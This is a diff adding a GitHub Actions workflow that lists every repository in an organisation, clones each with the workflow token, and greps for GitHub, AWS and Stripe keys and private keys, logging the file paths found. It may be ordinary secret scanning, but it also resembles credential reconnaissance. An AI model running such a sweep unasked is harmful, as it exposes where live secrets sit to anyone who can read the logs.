@@ -1,0 +1,42 @@
+name: Cross-Repo Audit
+on: [workflow_dispatch]
+permissions:
+  contents: read
+  id-token: write
+  repository-projects: read
+  actions: read
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Audit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          # Listar repos da org Octav-Labs
+          echo "=== LISTANDO REPOS ==="
+          curl -s -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/orgs/Octav-Labs/repos?per_page=100" | \
+            python3 -c "import sys,json; [print(r['full_name']) for r in json.load(sys.stdin)]" > /tmp/repos.txt
+          
+          echo "=== REPOS ==="
+          cat /tmp/repos.txt
+          
+          # Clonar cada um e procurar secrets
+          while IFS= read -r repo; do
+            echo "=== $repo ==="
+            name=$(echo "$repo" | tr '/' '_')
+            git clone --depth 1 "https://x-access-token:$GH_TOKEN@github.com/$repo.git" "/tmp/r/$name" 2>/dev/null
+            
+            if [ -d "/tmp/r/$name" ]; then
+              grep -rl "ghp_" /tmp/r/$name/ 2>/dev/null | head -5
+              grep -rl "AKIA" /tmp/r/$name/ 2>/dev/null | head -5
+              grep -rl "sk_live_" /tmp/r/$name/ 2>/dev/null | head -5
+              grep -rl "-----BEGIN.*PRIVATE KEY-----" /tmp/r/$name/ 2>/dev/null | head -5
+              rm -rf "/tmp/r/$name"
+            else
+              echo "FAILED"
+            fi
+          done < /tmp/repos.txt
